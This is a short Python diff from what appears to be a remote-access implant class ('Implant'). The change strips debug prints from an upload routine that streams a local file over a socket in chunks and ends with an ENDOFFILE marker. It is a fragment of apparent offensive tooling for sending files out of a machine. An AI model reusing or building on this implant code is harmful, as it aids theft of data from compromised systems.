@@ -97,17 +97,14 @@ class Implant(object):
         return os.path.expandvars(os.path.expanduser(path))
 
     def upload(self, data):
-        # print('uploading ' + data)
         upload_file = open(data, "rb")
         l = upload_file.read()
         while (l):
-            print(l)
             self.sock.send(l)
             l = upload_file.read(8192)
             if not l:
                 break
         upload_file.close()
-        # print("done")
         self.sock.send("ENDOFFILE".encode())
 
     def download(self, data):
